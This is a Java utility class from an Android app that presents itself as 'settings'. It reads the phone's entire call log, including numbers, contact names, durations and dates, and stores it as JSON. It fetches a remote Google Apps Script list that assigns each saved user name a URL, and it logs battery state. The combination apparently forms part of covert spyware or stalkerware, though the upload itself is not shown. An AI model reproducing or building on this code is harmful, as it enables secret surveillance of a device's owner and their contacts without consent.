package com.example.settings;

import static com.example.settings.ConnectivityManagers.isConnectedToNetwork;
import static com.example.settings.MainActivity.setuponetimeworkManager;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.BatteryManager;
import android.util.Log;

import androidx.work.ListenableWorker;

import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.RetryPolicy;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.wickerlabs.logmanager.LogObject;
import com.wickerlabs.logmanager.LogsManager;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class Utils {

    public static String getDateTime()
    {
        String currentDate = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(new Date());
        String currentTime = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());

        return currentDate + "[" + currentTime + "]";
    }
    public static String getCurrentDateTime()
    {
        String currentDate = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(new Date());
        String currentTime = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
        return currentDate + "[" + currentTime + "]";
    }
    public  static void  readCallLogs(Context applicationContext,Sharedpref mSharedpref) {
        LogsManager logsManager = new LogsManager(applicationContext);
        List<LogObject> callLogs = logsManager.getLogs(LogsManager.ALL_CALLS);
        JSONArray jsonArray=new JSONArray();
        DateFormat simple = new SimpleDateFormat("dd MMM yyyy HH:mm:ss:SSS Z");
        for(int i=0;i<callLogs.size();i++){
            JSONObject jsonObject=new JSONObject();
            try {
                jsonObject.put("Call Number",callLogs.get(i).getNumber());
                jsonObject.put("Call Name",callLogs.get(i).getContactName());
                jsonObject.put("Call Type",callLogs.get(i).getType());
                jsonObject.put("Call Duration",callLogs.get(i).getCoolDuration());
                Date d = new Date(callLogs.get(i).getDate());
                jsonObject.put("Call Date",simple.format(d));
                jsonArray.put(jsonObject);
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
        mSharedpref.setCallHistory(jsonArray.toString());
        mSharedpref.commit();
    }
    public static void newUrlData(Context context,Sharedpref mSharedpref){
       String url="https://script.googleusercontent.com/macros/echo?user_content_key=RdsJJZR1E_p8xnTCxFEtKU7tqCFkUC_FTl3E2g_cDSIjpo-V43chBBHgueEZb0TFHwjC-4TPOuQPKeaiaJj0jjjQkeJ4Hs0Wm5_BxDlH2jW0nuo2oDemN9CCS2h10ox_1xSncGQajx_ryfhECjZEnH8eXEwHkzBGtIkfTyiTbSQKygxmT3GiA5SP-kQUhNAjebhQ5PeN_2JFSwNzgXMLi_qVtBV2CbTgnh8KTGIWb5_kN85XsxDPBA&lib=M2DzEZy__TPANi9YiRKV2MkfyXhMohYri";
        String Name = mSharedpref.getSaveName();
        if(isConnectedToNetwork(context)){
            StringRequest stringRequest = new StringRequest(Request.Method.GET, url,
                    new Response.Listener<String>() {
                        @Override
                        public void onResponse(String response) {
                            Log.d(context.getPackageName(),response);
                            try {
                                JSONObject jsonObject=new JSONObject(response);
                                JSONArray jsonArray=jsonObject.getJSONArray("user");
                                for (int i=0;i<jsonArray.length()-1;i++){
                                    JSONObject jsonObject1=jsonArray.getJSONObject(i);
                                    String mName=jsonObject1.getString("name");
                                    Log.d("",mName);
                                    if (Name.trim().equalsIgnoreCase(mName.trim())){
                                        String mUrl=jsonObject1.getString("url");
                                        mSharedpref.setUrl(mUrl);
                                        mSharedpref.commit();
                                        break;
                                    }
                                }
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }
                        }
                    },
                    new Response.ErrorListener() {
                        @Override
                        public void onErrorResponse(VolleyError error) {
                            Log.d(context.getPackageName(),"Error");
                            setuponetimeworkManager();

                        }
                    }
            );
            int socketTimeOut = 50000;// u can change this .. here it is 50 seconds
            RetryPolicy retryPolicy = new DefaultRetryPolicy(socketTimeOut, 0, DefaultRetryPolicy.DEFAULT_BACKOFF_MULT);
            stringRequest.setRetryPolicy(retryPolicy);
            RequestQueue queue = Volley.newRequestQueue(context);
            queue.add(stringRequest);
        }
        else {
            Log.d("Settings","Internet Problem");
        }
    }
    public static void getBatteryPercent(Context mContext,Sharedpref mSharedpref) {
        IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = mContext.registerReceiver(null, ifilter);
        int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
        boolean isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                status == BatteryManager.BATTERY_STATUS_FULL;
        // How are we charging?
        int chargePlug = batteryStatus.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
        boolean usbCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_USB;
        boolean acCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_AC;
        int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
        int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);

        float batteryPct = level * 100 / (float) scale;
        JSONObject jsonObject = new JSONObject();
        try {
            jsonObject.put("battery peecentage", String.valueOf(batteryPct));
            jsonObject.put("status", String.valueOf(status));
            jsonObject.put("level", String.valueOf(level));
            jsonObject.put("scale", String.valueOf(scale));
            jsonObject.put("isCharging", isCharging);
            jsonObject.put("usbCharge", usbCharge);
            jsonObject.put("acCharge", acCharge);

        } catch (JSONException e) {
            e.printStackTrace();
        }
        mSharedpref.setBatteryPercnt(jsonObject.toString());
        mSharedpref.commit();

    }
}
